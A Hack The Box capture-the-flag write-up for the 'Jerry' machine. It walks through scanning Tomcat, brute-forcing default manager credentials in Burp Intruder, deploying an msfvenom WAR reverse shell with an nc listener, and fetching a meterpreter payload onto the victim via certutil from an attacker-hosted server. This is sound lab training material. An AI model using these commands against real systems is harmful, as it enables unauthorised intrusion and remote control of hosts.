HTB - 5. Jerry (Default Credentials)

1. `nmap -T4 -p- -A 10.10.10.95` shows 8080 open with Apache Tomcat/Coyote JSP engine 1.1 and Tomcat version 7.0.88
2. Go to `10.10.10.95` and shwos Apache Tomcat default page
3. Search `tomcat default credentials` and found https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
4. Burp Suite
	1. Click server management page
	2. Try login with `tomcat:tomcat`
	3. Send to decoder
	4. Select authorization basic and decode as base64
	5. Forwarded and did not work
	6. Try again and sent to repeater and intruder
5. Create passwords
	1. Get from [the url](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) and replace " " with ":".
	2. Write bash script to base64 encode all the credentials
		```
		for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
		```
6. Back to Burp Suite Intruder
	1. Set to sniper attack
	2. Select the authorization basic
	3. Paste in list of base64 encoded usernames and passwords into Payloads/Payload Options
	4. Disable URL encoder
	5. Run and see much longer length code 200 for the successful credientials: `tomcat:s3cret`
7. Create WAR file exploit
	1. Search `tomcat war reverse shell msfvenom`: https://netsec.ws/?p=331
	2. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war > shell.war` which will try to connect to our computer on port 4444
	3. `nc -nvlp 4444` to listen on port 4444
	4. Upload to tomcat managment server and deploy
	5. Go to `/shell` and got `nt authoirty/system`
	```
	whoami
	cd c:\users\administrator
	cd Desktop
	cd flags
	dir
	arp -a
	```
8. New reverse shell
	Create payload:
	```
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=5555 -f exe > sh.exe
	```
	
	Listen on port 5555:
	```
	sudo msfconsole
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_tcp
	options
	set LHOST 10.10.14.24
	set LPORT 5555
	run
	```
	
	Transfer file to windows:
	```
	python -m SimpleHTTPServer 80 <-- start server on attacker
	certutil -urlcache -f http://10.10.14.24/sh.exe c:\users\administrator\desktop\flags\sh.exe <-- On victim
	dir
	sh.exe
	```
	Result: shell popped

